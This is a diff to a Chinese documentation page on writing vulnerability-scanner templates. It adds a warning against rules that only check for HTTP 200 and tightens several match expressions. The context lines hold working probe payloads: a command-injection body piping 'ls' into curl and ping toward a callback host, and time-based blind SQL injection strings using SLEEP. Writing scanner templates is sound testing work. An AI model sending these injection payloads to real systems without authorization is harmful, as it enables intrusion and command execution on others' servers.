@@ -37,6 +37,8 @@ title: '编写模板'
 
 ## 常规漏洞检测模版（Vulns）
 
+<Warning>本着在保证准确性的前提下尽可能少发包的原则，切忌在第一个规则中的expression只使用一个`response.status == 200`这样的规则，这样基本等于会多发一个请求，理论上多少都应该有一些特征。</Warning>
+
 ### 未授权类（Unauth）
 
 <CodeGroup>
@@ -450,14 +452,14 @@ title: '编写模板'
           method: POST
           path: /run
           body: test=ls|curl+{{reverseURL}}
-        expression: reverse.wait(5)
+        expression: reverse.wait(5) && response.body_string.contains("xxxx")
       r1:
         request:
           cache: true
           method: POST
           path: /run
           body: test=ls|ping+reverseDomain
-        expression: reverse.wait(5)
+        expression: reverse.wait(5) && response.body_string.contains("xxxx")
     expression: r0() || r1()
     detail:
       author: test
@@ -767,7 +769,7 @@ title: '编写模板'
           cache: true
           method: GET
           path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP(0))))%23
-        expression: response.status == 200
+        expression: response.status == 200 && response.body_string.contains("xxxx")
         output:
           r0latency: response.latency
       r1:
@@ -776,14 +778,14 @@ title: '编写模板'
           method: GET
           read_timeout: "10"
           path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP({{sleepSecond1}}))))%23
-        expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000
+        expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000 && response.body_string.contains("xxxx")
       r2:
         request:
           cache: true
           method: GET
           read_timeout: "10"
           path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP({{sleepSecond2}}))))%23
-        expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000
+        expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000 && response.body_string.contains("xxxx")
     expression: r0() && r1() && r2()
     detail:
       author: test
